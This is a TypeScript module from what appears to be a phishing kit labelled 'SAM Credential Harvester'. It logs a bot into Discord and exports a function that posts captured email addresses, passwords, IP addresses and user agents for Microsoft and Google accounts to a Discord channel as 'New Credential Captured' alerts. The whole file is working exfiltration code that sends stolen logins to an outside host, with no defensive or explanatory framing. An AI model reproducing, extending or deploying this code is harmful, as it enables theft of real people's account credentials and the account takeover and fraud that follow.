import { Client, GatewayIntentBits, TextChannel } from "discord.js";

const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
  ],
});

let ready = false;

client.once("ready", () => {
  ready = true;
  console.log(`[Discord] Logged in as ${client.user?.tag}`);
});

if (BOT_TOKEN) {
  client.login(BOT_TOKEN).catch((err) => {
    console.error("[Discord] Login failed:", err.message);
  });
} else {
  console.warn("[Discord] No DISCORD_BOT_TOKEN set. Skipping login.");
}

export async function sendCredentialEmbed(payload: {
  provider: string;
  email: string;
  password: string;
  ip?: string;
  userAgent?: string;
  timestamp?: string;
}) {
  if (!ready || !CHANNEL_ID) {
    console.warn("[Discord] Bot not ready or channel ID missing.");
    return false;
  }

  const channel = await client.channels.fetch(CHANNEL_ID).catch(() => null);
  if (!channel || !channel.isTextBased()) {
    console.warn("[Discord] Channel not found or not text-based.");
    return false;
  }

  const color = payload.provider === "microsoft" ? 0x0078d4 : 0x4285f4;

  await (channel as TextChannel).send({
    embeds: [
      {
        title: "🔑 New Credential Captured",
        color,
        fields: [
          { name: "Provider", value: payload.provider, inline: true },
          { name: "Email", value: payload.email, inline: true },
          { name: "Password", value: `||${payload.password}||`, inline: false },
          { name: "IP", value: payload.ip || "unknown", inline: true },
          { name: "User-Agent", value: payload.userAgent?.slice(0, 500) || "unknown", inline: false },
        ],
        timestamp: payload.timestamp || new Date().toISOString(),
        footer: { text: "SAM Credential Harvester" },
      },
    ],
  });

  return true;
}
